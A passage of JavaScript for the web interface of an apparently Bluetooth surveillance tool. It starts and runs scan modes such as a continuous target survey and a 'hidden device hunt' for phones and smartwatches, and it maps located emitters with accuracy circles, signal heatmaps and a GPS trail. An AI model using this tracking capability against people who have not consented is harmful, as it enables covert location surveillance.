    // Center map on first GPS fix, or follow GPS if enabled
    if (!initialMapCentered) {
        // First GPS fix - center map on system location
        initialMapCentered = true;
        map.flyTo({
            center: [location.lon, location.lat],
            zoom: 15,
            duration: 1500
        });
        addLogEntry('Map centered on system location', 'INFO');
    } else if (followGps) {
        // Follow GPS if enabled
        map.flyTo({
            center: [location.lon, location.lat],
            zoom: Math.max(map.getZoom(), 15),
            duration: 1000
        });
    }

    // Update system trail in real-time if enabled
    updateLiveTrail(location.lon, location.lat);

    // Update communication lines for active geo tracking
    updateCommLines();
}

/**
 * Select a device
 */
function selectDevice(device) {
    document.getElementById('selectedDevice').textContent = device.bd_address;

    // Center map on device if it has location
    if (device.emitter_lat && device.emitter_lon) {
        map.flyTo({
            center: [device.emitter_lon, device.emitter_lat],
            zoom: 17,
            duration: 1000
        });

        // Open popup
        if (markers[device.bd_address]) {
            markers[device.bd_address].togglePopup();
        }
    }
}

/**
 * Update statistics
 */
function updateStats() {
    let classic = 0;
    let ble = 0;
    let targetCount = 0;
    let located = 0;
    let totalRssi = 0;
    let rssiCount = 0;
    const manufacturerCounts = {};

    Object.values(devices).forEach(device => {
        if (device.is_target) targetCount++;
        if (device.device_type === 'classic') classic++;
        else if (device.device_type === 'ble') ble++;

        // Count devices with location data
        if (device.emitter_lat && device.emitter_lon) located++;

        // Calculate average RSSI
        if (device.rssi && device.rssi !== '--') {
            totalRssi += parseInt(device.rssi);
            rssiCount++;
        }

        // Count manufacturers
        const mfr = device.bt_company || device.manufacturer || 'Unknown';
        if (mfr && mfr !== 'Unknown') {
            manufacturerCounts[mfr] = (manufacturerCounts[mfr] || 0) + 1;
        }
    });

    // Update stat boxes
    const totalDevices = Object.keys(devices).length;
    document.getElementById('statTotalDevices').textContent = totalDevices;
    document.getElementById('statClassic').textContent = classic;
    document.getElementById('statBLE').textContent = ble;
    document.getElementById('statTargets').textContent = targetCount;
    document.getElementById('statLocated').textContent = located;

    // Average RSSI
    const avgRssi = rssiCount > 0 ? Math.round(totalRssi / rssiCount) : '--';
    document.getElementById('statAvgRSSI').textContent = avgRssi === '--' ? '--' : `${avgRssi}`;

    // Top manufacturer
    let topMfr = '--';
    let topMfrCount = 0;
    Object.entries(manufacturerCounts).forEach(([mfr, count]) => {
        if (count > topMfrCount) {
            topMfrCount = count;
            topMfr = mfr.length > 15 ? mfr.substring(0, 12) + '...' : mfr;
        }
    });
    document.getElementById('statTopManufacturer').textContent = topMfr;
}

// Session timer
let sessionStartTime = Date.now();
let sessionTimerInterval = null;

function updateSessionTime() {
    const elapsed = Math.floor((Date.now() - sessionStartTime) / 1000);
    const hours = Math.floor(elapsed / 3600).toString().padStart(2, '0');
    const minutes = Math.floor((elapsed % 3600) / 60).toString().padStart(2, '0');
    const seconds = (elapsed % 60).toString().padStart(2, '0');
    const el = document.getElementById('statSessionTime');
    if (el) el.textContent = `${hours}:${minutes}:${seconds}`;
}

function startSessionTimer() {
    // Clear any existing interval
    if (sessionTimerInterval) clearInterval(sessionTimerInterval);
    // Reset start time
    sessionStartTime = Date.now();
    // Update immediately
    updateSessionTime();
    // Then update every second
    sessionTimerInterval = setInterval(updateSessionTime, 1000);
}

/**
 * Clear all devices
 */
function clearAllDevices() {
    // Remove all markers
    Object.values(markers).forEach(marker => marker.remove());
    markers = {};

    // Remove all CEP circles
    Object.keys(cepCircles).forEach(bdAddr => {
        const sourceId = `cep-${bdAddr}`;
        if (map.getLayer(sourceId)) map.removeLayer(sourceId);
        if (map.getSource(sourceId)) map.removeSource(sourceId);
    });
    cepCircles = {};

    // Clear devices
    devices = {};

    // Update UI
    updateSurveyTable();
    updateStats();
    document.getElementById('deviceCount').textContent = '0';
    document.getElementById('surveyCount').textContent = '0';
    document.getElementById('targetCount').textContent = '0';
}

// ==================== SCAN CONTROLS ====================

// Scan mode descriptions for UI feedback
const SCAN_MODE_INFO = {
    'quick': 'Standard inquiry - discoverable devices only',
    'target_survey': 'Continuous target monitoring - L2PING, SDP, Name, RSSI (runs until stopped)',
    'hidden_hunt': 'Targeting hidden phones/watches - BLE+Classic+OUI probing',
    'stimulate_classic': 'Multi-LAP stimulation for Classic BT devices',
    'stimulate_ble': 'Extended LE scan for BLE devices',
    'aggressive_inquiry': 'Extended inquiry with 7 LAP codes, interlaced scanning',
    'advanced': 'All techniques: HCI optimization, aggressive inquiry, SDP probes, address sweeps'
};

function startScan() {
    const modeSelect = document.getElementById('scanModeSelect');
    const mode = modeSelect ? modeSelect.value : 'quick';

    // Show scan info
    showScanInfo(SCAN_MODE_INFO[mode] || 'Scanning...');

    switch(mode) {
        case 'quick':
            startQuickScan();
            break;
        case 'target_survey':
            startTargetSurvey();
            break;
        case 'hidden_hunt':
            startHiddenDeviceHunt();
            break;
        case 'stimulate_classic':
            startStimulationScan('classic');
            break;
        case 'stimulate_ble':
            startStimulationScan('ble');
            break;
        case 'aggressive_inquiry':
            startAggressiveInquiry();
            break;
        case 'advanced':
            startAdvancedScan();
            break;
        default:
            startQuickScan();
    }
}

function startQuickScan() {
    fetch('/api/scan/start', { method: 'POST' })
        .then(response => response.json())
        .then(data => {
            updateScanStatus(true);
            addLogEntry('Quick scan started', 'INFO');
        })
        .catch(error => {
            addLogEntry('Failed to start scan: ' + error, 'ERROR');
            hideScanInfo();
        });
}

function startTargetSurvey() {
    const opId = `survey-${Date.now()}`;
    addOperation(opId, 'SURVEY', 'Target Survey (Continuous Monitoring)', {
        cancellable: true,
        cancelFn: () => {
            fetch('/api/scan/target_survey/stop', { method: 'POST' });
        }
    });
    addLogEntry('Starting CONTINUOUS TARGET SURVEY - monitoring all targets...', 'INFO');
    updateScanStatus(true);

    // Always run in continuous mode with 30 second intervals
    fetch('/api/scan/target_survey', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            continuous: true,
            interval: 30
        })
    })
        .then(response => response.json())
        .then(data => {
            if (data.status === 'started') {
                addLogEntry(`Continuous target survey started - monitoring ${data.target_count} target(s) every ${data.interval}s`, 'INFO');
                // Poll to keep operation status updated (and detect if survey stops)
                pollTargetSurveyStatus(opId);
            } else if (data.status === 'no_targets') {
                removeOperation(opId);
                addLogEntry('No targets defined. Add targets first.', 'WARNING');
                hideScanInfo();
                updateScanStatus(false);
            } else {
                removeOperation(opId);
                addLogEntry(`Target survey: ${data.message || 'error'}`, 'WARNING');
                hideScanInfo();
            }
        })
        .catch(error => {
            removeOperation(opId);
            addLogEntry('Target survey failed: ' + error, 'ERROR');
            hideScanInfo();
        });
}

function pollTargetSurveyStatus(opId) {
    fetch('/api/scan/target_survey/status')
        .then(response => response.json())
        .then(data => {
            if (data.active) {
                // Still running - update operation label with sweep count if continuous
                if (data.continuous && data.sweep_count > 0) {
                    updateOperationLabel(opId, `Target Survey (Sweep #${data.sweep_count} - ${data.found_count}/${data.results_count} detected)`);
                }
                // Poll again
                setTimeout(() => pollTargetSurveyStatus(opId), 3000);
            } else {
                removeOperation(opId);
                const foundCount = data.found_count || 0;
                const totalCount = data.results_count || 0;
                const sweepCount = data.sweep_count || 1;
                addLogEntry(`Target survey stopped after ${sweepCount} sweep(s): ${foundCount}/${totalCount} targets detected`, 'INFO');
                hideScanInfo();
                updateScanStatus(false);
            }
        })
        .catch(error => {
            removeOperation(opId);
            addLogEntry('Target survey status check failed: ' + error, 'ERROR');
            hideScanInfo();
        });
}

// Helper to update an operation's label (for showing sweep progress)
function updateOperationLabel(opId, newLabel) {
    const opElement = document.querySelector(`[data-operation-id="${opId}"] .operation-label`);
    if (opElement) {
        opElement.textContent = newLabel;
    }
}

function startStimulationScan(type) {
    const opId = `stim-${type}-${Date.now()}`;
    const label = type === 'ble' ? 'BLE Stimulation' : 'Classic Stimulation';
    addOperation(opId, 'STIM', label, { cancellable: false });
    addLogEntry(`Starting ${type} stimulation scan...`, 'INFO');

    // Also start normal scanning
    fetch('/api/scan/start', { method: 'POST' }).catch(() => {});
    updateScanStatus(true);

    fetch('/api/scan/stimulate', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ type: type })
    })
        .then(response => response.json())
        .then(data => {
            removeOperation(opId);
            addLogEntry(`Stimulation complete: ${data.count} devices found`, 'INFO');
            hideScanInfo();
        })
        .catch(error => {
            removeOperation(opId);
            addLogEntry('Stimulation failed: ' + error, 'ERROR');
            hideScanInfo();
        });
}

function startAggressiveInquiry() {
    const opId = `aggressive-${Date.now()}`;
    addOperation(opId, 'AGG', 'Aggressive Inquiry', { cancellable: true });
    addLogEntry('Starting aggressive inquiry (multi-LAP, interlaced)...', 'INFO');

    // Start background scanning too
    fetch('/api/scan/start', { method: 'POST' }).catch(() => {});
    updateScanStatus(true);

    fetch('/api/scan/aggressive', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ duration: 20 })
    })
        .then(response => response.json())
        .then(data => {
            removeOperation(opId);
            if (data.status === 'completed') {
                addLogEntry(`Aggressive inquiry complete: ${data.devices_found || 0} devices`, 'INFO');
            } else {
                addLogEntry(`Aggressive inquiry: ${data.message || 'started'}`, 'INFO');
            }
            hideScanInfo();
        })
        .catch(error => {
            removeOperation(opId);
            addLogEntry('Aggressive inquiry failed: ' + error, 'ERROR');
            hideScanInfo();
        });
}

function startAdvancedScan() {
    const opId = `advanced-${Date.now()}`;
    addOperation(opId, 'ADV', 'Advanced Scan (All Techniques)', { cancellable: true });
    addLogEntry('Starting advanced scan (all techniques)...', 'INFO');
    updateScanStatus(true);

    fetch('/api/scan/advanced', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ duration: 30, aggressive: true })
    })
        .then(response => response.json())
        .then(data => {
            if (data.status === 'started') {
                addLogEntry('Advanced scan running in background...', 'INFO');
                // Poll for completion
                pollAdvancedScanStatus(opId);
            } else {
                removeOperation(opId);
                addLogEntry(`Advanced scan: ${data.message || 'error'}`, 'WARNING');
                hideScanInfo();
            }
        })
        .catch(error => {
            removeOperation(opId);
            addLogEntry('Advanced scan failed: ' + error, 'ERROR');
            hideScanInfo();
        });
}

function pollAdvancedScanStatus(opId) {
    fetch('/api/scan/advanced/status')
        .then(response => response.json())
        .then(data => {
            if (data.active) {
                // Still running, poll again
                setTimeout(() => pollAdvancedScanStatus(opId), 2000);
            } else {
                removeOperation(opId);
                addLogEntry('Advanced scan complete', 'INFO');
                hideScanInfo();
            }
        })
        .catch(() => {
            removeOperation(opId);
            hideScanInfo();
        });
}

function startHiddenDeviceHunt() {
    const opId = `hidden-${Date.now()}`;
    addOperation(opId, 'HUNT', 'Hidden Device Hunt (Phones/Watches)', {
        cancellable: true,
        cancelFn: () => {
            fetch('/api/scan/hidden/stop', { method: 'POST' });
        }
    });
    addLogEntry('Starting HIDDEN DEVICE HUNT - targeting phones, smartwatches, fitness trackers...', 'INFO');
    updateScanStatus(true);

    // Also start background scanning for btmon RSSI capture
    fetch('/api/scan/start', { method: 'POST' }).catch(() => {});

    fetch('/api/scan/hidden', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ duration: 45 })
    })
        .then(response => response.json())
        .then(data => {
            if (data.status === 'started') {
                addLogEntry('Hidden device hunt running - 5 phase detection in progress...', 'INFO');
                // Poll for completion
                pollHiddenScanStatus(opId);
            } else {
                removeOperation(opId);
                addLogEntry(`Hidden device hunt: ${data.message || 'error'}`, 'WARNING');
                hideScanInfo();
            }
        })
        .catch(error => {
            removeOperation(opId);
            addLogEntry('Hidden device hunt failed: ' + error, 'ERROR');
            hideScanInfo();
        });
}

function pollHiddenScanStatus(opId) {
    fetch('/api/scan/hidden/status')
        .then(response => response.json())
        .then(data => {
            if (data.active) {
                // Still running, poll again
                setTimeout(() => pollHiddenScanStatus(opId), 2000);
            } else {
                removeOperation(opId);
                addLogEntry('Hidden device hunt complete', 'INFO');
                hideScanInfo();
            }
        })
        .catch(() => {
            removeOperation(opId);
            hideScanInfo();
        });
}

function showScanInfo(text) {
    const infoRow = document.getElementById('scanInfoRow');
    const infoText = document.getElementById('scanInfoText');
    if (infoRow && infoText) {
        infoText.textContent = text;
        infoRow.style.display = 'block';
    }
}

function hideScanInfo() {
    const infoRow = document.getElementById('scanInfoRow');
    if (infoRow) {
        infoRow.style.display = 'none';
    }
}

function stopScan() {
    fetch('/api/scan/stop', { method: 'POST' })
        .then(response => response.json())
        .then(data => {
            updateScanStatus(false);
            addLogEntry('Scan stopped', 'INFO');
        })
        .catch(error => {
            addLogEntry('Failed to stop scan: ' + error, 'ERROR');
        });
}

function clearResults() {
    fetch('/api/devices/clear', { method: 'POST' })
        .then(response => response.json())
        .then(data => {
            addLogEntry('Results cleared', 'INFO');
        })
        .catch(error => {
            addLogEntry('Failed to clear results: ' + error, 'ERROR');
        });
}

function updateScanStatus(isScanning) {
    scanning = isScanning;
    const indicator = document.getElementById('statusIndicator');
    const statusText = indicator.querySelector('.status-text');
    const startBtn = document.getElementById('btnStartScan');
    const stopBtn = document.getElementById('btnStopScan');
    const activityIndicator = document.getElementById('activityIndicator');

    if (isScanning) {
        indicator.classList.add('active');
        statusText.textContent = 'SCANNING';
        startBtn.disabled = true;
        stopBtn.disabled = false;
        // Activate radar animation
        if (activityIndicator) {
            activityIndicator.classList.add('active');
        }
        // Track in operations bar
        addOperation('scan', 'SCAN', 'BT Scan Active', {
            cancellable: true,
            cancelFn: () => stopScan()
        });
    } else {
        indicator.classList.remove('active');
        statusText.textContent = 'STANDBY';
        startBtn.disabled = false;
        stopBtn.disabled = true;
        // Deactivate radar animation
        if (activityIndicator) {
            activityIndicator.classList.remove('active');
        }
        // Remove from operations bar
        removeOperation('scan');
    }
}

// ==================== MAP CONTROLS ====================

function setMapStyle(style) {
    if (currentMapStyle === style) return;

    currentMapStyle = style;
    map.setStyle(MAP_STYLES[style]);

    // Persist map style to localStorage
    localStorage.setItem('bluek9_map_style', style);

    // Update dropdown selection
    const layerSelect = document.getElementById('mapLayerSelect');
    if (layerSelect) layerSelect.value = style;

    // Update button states (legacy support)
    document.querySelectorAll('.btn-map').forEach(btn => {
        btn.classList.toggle('active', btn.dataset.style === style);
    });

    // Re-add markers after style loads
    map.once('styledata', () => {
        // Re-add system marker
        if (systemMarker) {
            const lngLat = systemMarker.getLngLat();
            systemMarker.remove();
            const el = document.createElement('div');
            el.className = 'system-marker';
            systemMarker = new mapboxgl.Marker(el)
                .setLngLat(lngLat)
                .setPopup(new mapboxgl.Popup({ offset: 25 }).setHTML('<strong>SYSTEM LOCATION</strong>'))
                .addTo(map);
        }

        // Re-add device markers
        Object.values(devices).forEach(device => {
            if (device.emitter_lat && device.emitter_lon) {
                updateDeviceMarker(device);
            }
        });

        // Re-apply 3D terrain if enabled
        if (show3dTerrain) {
            if (!map.getSource('mapbox-dem')) {
                map.addSource('mapbox-dem', {
                    type: 'raster-dem',
                    url: 'mapbox://mapbox.mapbox-terrain-dem-v1',
                    tileSize: 512,
                    maxzoom: 14
                });
            }
            map.setTerrain({ source: 'mapbox-dem', exaggeration: 1.5 });
        }

        // Re-apply 3D buildings if enabled
        if (show3dBuildings && !map.getLayer('3d-buildings')) {
            const layers = map.getStyle().layers;
            let labelLayerId;
            for (let i = 0; i < layers.length; i++) {
                if (layers[i].type === 'symbol' && layers[i].layout['text-field']) {
                    labelLayerId = layers[i].id;
                    break;
                }
            }

            map.addLayer({
                id: '3d-buildings',
                source: 'composite',
                'source-layer': 'building',
                filter: ['==', 'extrude', 'true'],
                type: 'fill-extrusion',
                minzoom: 15,
                paint: {
                    'fill-extrusion-color': '#1a2633',
                    'fill-extrusion-height': ['get', 'height'],
                    'fill-extrusion-base': ['get', 'min_height'],
                    'fill-extrusion-opacity': 0.7
                }
            }, labelLayerId);
        }
    });
}

function toggleFollowGps() {
    followGps = document.getElementById('toggleFollowGps').checked;
    fetch('/api/gps/follow', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ follow: followGps })
    });
}

function toggleShowCep() {
    showCep = document.getElementById('toggleShowCep').checked;

    if (showCep) {
        // Add CEP circles for all devices
        Object.values(devices).forEach(device => {
            if (device.emitter_lat && device.emitter_lon && device.emitter_accuracy) {
                addCepCircle(device);
            }
        });
    } else {
        // Remove all CEP circles
        Object.keys(cepCircles).forEach(bdAddr => {
            const sourceId = `cep-${bdAddr}`;
            if (map.getLayer(sourceId)) map.removeLayer(sourceId);
            if (map.getSource(sourceId)) map.removeSource(sourceId);
        });
        cepCircles = {};
    }
}

// ==================== RECENTER & MEASUREMENT ====================

/**
 * Recenter map on current system location
 */
function recenterOnSystem() {
    if (systemMarker) {
        const lngLat = systemMarker.getLngLat();
        map.flyTo({
            center: [lngLat.lng, lngLat.lat],
            zoom: 17,
            duration: 1000
        });
        addLogEntry('Recentered on system location', 'INFO');
    } else {
        addLogEntry('No GPS fix available', 'WARNING');
    }
}

// Measurement state
let measureMode = false;
let measurePoints = [];
let measureMarkers = [];
let measureLine = null;

/**
 * Toggle measurement mode
 */
function toggleMeasure() {
    measureMode = !measureMode;
    const btn = document.getElementById('measureBtn');
    const info = document.getElementById('measureInfo');

    if (measureMode) {
        btn.classList.add('active');
        info.classList.remove('hidden');
        map.getCanvas().style.cursor = 'crosshair';
        addLogEntry('Measurement mode ON - click two points on map', 'INFO');

        // Add click handler for measurement
        map.on('click', handleMeasureClick);
    } else {
        btn.classList.remove('active');
        info.classList.add('hidden');
        map.getCanvas().style.cursor = '';
        map.off('click', handleMeasureClick);
        clearMeasure();
    }
}

/**
 * Handle map click for measurement
 */
function handleMeasureClick(e) {
    if (!measureMode) return;

    const lngLat = e.lngLat;
    measurePoints.push([lngLat.lng, lngLat.lat]);

    // Add marker
    const el = document.createElement('div');
    el.className = 'measure-marker';
    const marker = new mapboxgl.Marker(el)
        .setLngLat([lngLat.lng, lngLat.lat])
        .addTo(map);
    measureMarkers.push(marker);

    if (measurePoints.length === 2) {
        // Calculate and display distance
        const distance = calculateDistance(
            measurePoints[0][1], measurePoints[0][0],
            measurePoints[1][1], measurePoints[1][0]
        );
        const bearing = calculateBearing(
            measurePoints[0][1], measurePoints[0][0],
            measurePoints[1][1], measurePoints[1][0]
        );

        // Draw line
        if (map.getSource('measure-line')) {
            map.getSource('measure-line').setData({
                type: 'Feature',
                geometry: {
                    type: 'LineString',
                    coordinates: measurePoints
                }
            });
        } else {
            map.addSource('measure-line', {
                type: 'geojson',
                data: {
                    type: 'Feature',
                    geometry: {
                        type: 'LineString',
                        coordinates: measurePoints
                    }
                }
            });
            map.addLayer({
                id: 'measure-line-layer',
                type: 'line',
                source: 'measure-line',
                paint: {
                    'line-color': '#ffb000',
                    'line-width': 3,
                    'line-dasharray': [2, 1]
                }
            });
        }

        // Display results
        const meters = distance;
        const feet = meters * 3.28084;
        document.getElementById('measureDistance').innerHTML =
            `${meters.toFixed(1)}m / ${feet.toFixed(1)}ft`;
        document.getElementById('measureBearing').textContent =
            `${bearing.toFixed(1)}° ${getBearingDirection(bearing)}`;

        addLogEntry(`Distance: ${meters.toFixed(1)}m (${feet.toFixed(1)}ft), Bearing: ${bearing.toFixed(1)}°`, 'INFO');

        // Remove click handler after second point
        map.off('click', handleMeasureClick);
        map.getCanvas().style.cursor = '';
    }
}

/**
 * Clear measurement markers and line
 */
function clearMeasure() {
    measurePoints = [];
    measureMarkers.forEach(m => m.remove());
    measureMarkers = [];

    if (map.getLayer('measure-line-layer')) {
        map.removeLayer('measure-line-layer');
    }
    if (map.getSource('measure-line')) {
        map.removeSource('measure-line');
    }

    document.getElementById('measureDistance').textContent = '--';
    document.getElementById('measureBearing').textContent = '--';

    if (measureMode) {
        map.getCanvas().style.cursor = 'crosshair';
        map.on('click', handleMeasureClick);
    }
}

/**
 * Calculate distance between two points in meters (Haversine formula)
 */
function calculateDistance(lat1, lon1, lat2, lon2) {
    const R = 6371000; // Earth radius in meters
    const dLat = (lat2 - lat1) * Math.PI / 180;
    const dLon = (lon2 - lon1) * Math.PI / 180;
    const a = Math.sin(dLat/2) * Math.sin(dLat/2) +
              Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
              Math.sin(dLon/2) * Math.sin(dLon/2);
    const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
    return R * c;
}

/**
 * Calculate bearing between two points in degrees
 */
function calculateBearing(lat1, lon1, lat2, lon2) {
    const dLon = (lon2 - lon1) * Math.PI / 180;
    const lat1Rad = lat1 * Math.PI / 180;
    const lat2Rad = lat2 * Math.PI / 180;

    const y = Math.sin(dLon) * Math.cos(lat2Rad);
    const x = Math.cos(lat1Rad) * Math.sin(lat2Rad) -
              Math.sin(lat1Rad) * Math.cos(lat2Rad) * Math.cos(dLon);

    let bearing = Math.atan2(y, x) * 180 / Math.PI;
    return (bearing + 360) % 360;
}

/**
 * Get cardinal direction from bearing
 */
function getBearingDirection(bearing) {
    const directions = ['N', 'NNE', 'NE', 'ENE', 'E', 'ESE', 'SE', 'SSE',
                        'S', 'SSW', 'SW', 'WSW', 'W', 'WNW', 'NW', 'NNW'];
    const index = Math.round(bearing / 22.5) % 16;
    return directions[index];
}

// ==================== BREADCRUMB / HEATMAP ====================

// Target Heatworm - detection points
// Target Heatmap - RSSI-based amoeba (red=hot/center, blue=cold/outside)

function toggleBreadcrumbs() {
    showBreadcrumbs = document.getElementById('toggleBreadcrumbs').checked;

    if (showBreadcrumbs) {
        loadBreadcrumbs();
    } else {
        clearBreadcrumbs();
    }
}

function loadBreadcrumbs() {
    fetch('/api/breadcrumbs')
        .then(r => r.json())
        .then(points => {
            clearBreadcrumbs();

            if (points.length === 0) {
                addLogEntry('No heatmap data available', 'INFO');
                return;
            }

            // Create GeoJSON for heatmap layer
            const geojsonData = {
                type: 'FeatureCollection',
                features: points.filter(p => p.lat && p.lon).map(point => ({
                    type: 'Feature',
                    properties: {
                        // Convert RSSI to weight (stronger signal = higher weight)
                        // RSSI typically ranges from -30 (very strong) to -100 (very weak)
                        weight: Math.max(0, (point.rssi + 100) / 70),
                        rssi: point.rssi,
                        bd_address: point.bd_address
                    },
                    geometry: {
                        type: 'Point',
                        coordinates: [point.lon, point.lat]
                    }
                }))
            };

            // Add or update heatmap source
            if (map.getSource('rssi-heatmap')) {
                map.getSource('rssi-heatmap').setData(geojsonData);
            } else {
                map.addSource('rssi-heatmap', {
                    type: 'geojson',
                    data: geojsonData
                });

                // Add heatmap layer - amoeba effect with red=hot, blue=cold
                map.addLayer({
                    id: 'rssi-heatmap-layer',
                    type: 'heatmap',
                    source: 'rssi-heatmap',
                    paint: {
                        // Weight based on RSSI (stronger = more weight)
                        'heatmap-weight': ['get', 'weight'],
                        // Intensity increases with zoom
                        'heatmap-intensity': [
                            'interpolate', ['linear'], ['zoom'],
                            10, 0.5,
                            15, 1,
                            20, 2
                        ],
                        // Radius increases with zoom
                        'heatmap-radius': [
                            'interpolate', ['linear'], ['zoom'],
                            10, 15,
                            15, 30,
                            20, 50
                        ],
                        // Color ramp: blue (cold) -> cyan -> green -> yellow -> red (hot)
                        'heatmap-color': [
                            'interpolate', ['linear'], ['heatmap-density'],
                            0, 'rgba(0, 0, 255, 0)',        // Transparent
                            0.1, 'rgba(0, 0, 255, 0.4)',   // Blue (cold/far)
                            0.3, 'rgba(0, 255, 255, 0.5)', // Cyan
                            0.5, 'rgba(0, 255, 0, 0.6)',   // Green
                            0.7, 'rgba(255, 255, 0, 0.7)', // Yellow
                            0.9, 'rgba(255, 128, 0, 0.8)', // Orange
                            1.0, 'rgba(255, 0, 0, 0.9)'    // Red (hot/close)
                        ],
                        // Opacity
                        'heatmap-opacity': 0.7
                    }
                });
            }

            // Add detection markers (heatworm points) on top of heatmap
            points.forEach((point, index) => {
                if (!point.lat || !point.lon) return;

                const el = document.createElement('div');
                el.className = 'breadcrumb-marker heatworm-point';

                // Small white dot with colored ring based on RSSI
                const rssi = point.rssi || -70;
                const intensity = Math.min(1, Math.max(0, (rssi + 100) / 70));

                // Color: blue (weak) -> green -> yellow -> red (strong)
                let color;
                if (intensity < 0.33) {
                    color = `rgb(0, ${Math.round(intensity * 3 * 255)}, 255)`;
                } else if (intensity < 0.66) {
                    const t = (intensity - 0.33) * 3;
                    color = `rgb(${Math.round(t * 255)}, 255, ${Math.round((1 - t) * 255)})`;
                } else {
                    const t = (intensity - 0.66) * 3;
                    color = `rgb(255, ${Math.round((1 - t) * 255)}, 0)`;
                }

                el.style.width = '8px';
                el.style.height = '8px';
                el.style.backgroundColor = '#fff';
                el.style.border = `2px solid ${color}`;
                el.style.boxShadow = `0 0 4px ${color}`;
                el.title = `${point.bd_address}\nRSSI: ${rssi} dBm`;

                const marker = new mapboxgl.Marker(el)
                    .setLngLat([point.lon, point.lat])
                    .addTo(map);

                breadcrumbMarkers.push(marker);
            });

            addLogEntry(`Loaded heatmap: ${points.length} detection points`, 'INFO');
        })
        .catch(e => addLogEntry(`Failed to load heatmap: ${e}`, 'ERROR'));
}

function clearBreadcrumbs() {
    // Clear markers
    breadcrumbMarkers.forEach(m => m.remove());
    breadcrumbMarkers = [];

    // Clear heatmap layer and source
    if (map && map.getLayer('rssi-heatmap-layer')) {
        map.removeLayer('rssi-heatmap-layer');
    }
    if (map && map.getSource('rssi-heatmap')) {
        map.removeSource('rssi-heatmap');
    }
}

function resetBreadcrumbs() {
    if (!confirm('Reset all heatmap data? This will clear all RSSI history.')) return;

    fetch('/api/breadcrumbs/reset', { method: 'POST' })
        .then(r => r.json())
        .then(data => {
            clearBreadcrumbs();
            addLogEntry(`Heatmap reset: ${data.cleared} points cleared`, 'INFO');
        })
        .catch(e => addLogEntry(`Failed to reset heatmap: ${e}`, 'ERROR'));
}

/**
 * Reset heatmap only (alias for UI button)
 */
function resetHeatmap() {
    resetBreadcrumbs();
}

/**
 * Reset CEP circles only (without clearing geo data)
 */
function resetCepCircles() {
    Object.keys(cepCircles).forEach(bdAddr => {
        const sourceId = `cep-${bdAddr}`;
        if (map.getLayer(sourceId)) map.removeLayer(sourceId);
        if (map.getLayer(`${sourceId}-glow`)) map.removeLayer(`${sourceId}-glow`);
        if (map.getSource(sourceId)) map.removeSource(sourceId);
    });
    cepCircles = {};
    addLogEntry('CEP circles cleared', 'INFO');
}

// System Trail - where the system has been
let showSystemTrail = false;
let systemTrailMarkers = [];
let liveTrailCoordinates = [];  // Track coordinates for live updates
const MAX_TRAIL_POINTS = 500;   // Limit trail length for performance

function toggleSystemTrail() {
    showSystemTrail = document.getElementById('toggleSystemTrail').checked;

    if (showSystemTrail) {
        loadSystemTrail();
    } else {
        clearSystemTrail();
        liveTrailCoordinates = [];
    }
}

function loadSystemTrail() {
    fetch('/api/system_trail')
        .then(r => r.json())
        .then(points => {
            clearSystemTrail();

            if (points.length === 0) {
                // Initialize empty trail - will update live
                liveTrailCoordinates = [];
                return;
            }

            // Filter valid points and create coordinates array for line
            const validPoints = points.filter(p => p.lat && p.lon);
            const coordinates = validPoints.map(p => [p.lon, p.lat]);

            // Store for live updates
            liveTrailCoordinates = [...coordinates];

            if (coordinates.length > 1) {
                // Create GeoJSON for the trail line
                const lineData = {
                    type: 'Feature',
                    geometry: {
                        type: 'LineString',
                        coordinates: coordinates
                    }
                };

                // Add or update the trail line source
                if (map.getSource('system-trail-line')) {
                    map.getSource('system-trail-line').setData(lineData);
                } else {
                    map.addSource('system-trail-line', {
                        type: 'geojson',
                        data: lineData
                    });

                    // Add glow effect layer (behind the main line)
                    map.addLayer({
                        id: 'system-trail-glow',
                        type: 'line',
                        source: 'system-trail-line',
                        paint: {
                            'line-color': '#00d4ff',
                            'line-width': 6,
                            'line-blur': 4,
                            'line-opacity': 0.3
                        }
                    });

                    // Add main trail line
                    map.addLayer({
                        id: 'system-trail-layer',
                        type: 'line',
                        source: 'system-trail-line',
                        paint: {
                            'line-color': '#00d4ff',
                            'line-width': 2,
                            'line-opacity': 0.8
                        }
                    });
                }
            }

            // Add markers at key points (start, end, every 10th point)
            validPoints.forEach((point, index) => {
                // Only show markers at start, end, and every 10th point
                if (index !== 0 && index !== validPoints.length - 1 && index % 10 !== 0) return;

                const el = document.createElement('div');
                el.className = 'breadcrumb-marker system-trail';

                // Style based on position
                if (index === 0) {
                    // Start point - larger, brighter
                    el.style.backgroundColor = '#00d4ff';
                    el.style.width = '10px';
                    el.style.height = '10px';
                    el.style.border = '2px solid #fff';
                    el.style.boxShadow = '0 0 10px #00d4ff';
                    el.title = 'Trail Start';
                } else if (index === validPoints.length - 1) {
                    // End point - current position indicator
                    el.style.backgroundColor = '#00d4ff';
                    el.style.width = '8px';
                    el.style.height = '8px';
                    el.style.border = '2px solid #fff';
                    el.title = 'Trail End';
                } else {
                    // Intermediate points
                    const opacity = Math.max(0.4, 1 - (index / validPoints.length) * 0.6);
                    el.style.backgroundColor = `rgba(0, 212, 255, ${opacity})`;
                    el.style.width = '5px';
                    el.style.height = '5px';
                }

                const marker = new mapboxgl.Marker(el)
                    .setLngLat([point.lon, point.lat])
                    .addTo(map);

                systemTrailMarkers.push(marker);
            });

            addLogEntry(`Loaded system trail: ${validPoints.length} points, ${coordinates.length > 1 ? 'line connected' : 'markers only'}`, 'INFO');
        })
        .catch(e => addLogEntry(`Failed to load system trail: ${e}`, 'ERROR'));
}

function clearSystemTrail() {
    // Clear markers
    systemTrailMarkers.forEach(m => m.remove());
    systemTrailMarkers = [];

    // Clear line layers and source
    if (map.getLayer('system-trail-glow')) {
        map.removeLayer('system-trail-glow');
    }
    if (map.getLayer('system-trail-layer')) {
        map.removeLayer('system-trail-layer');
    }
    if (map.getSource('system-trail-line')) {
        map.removeSource('system-trail-line');
    }
}

function resetSystemTrail() {
    // Clear local state first
    clearSystemTrail();
    liveTrailCoordinates = [];

    // Clear server-side data
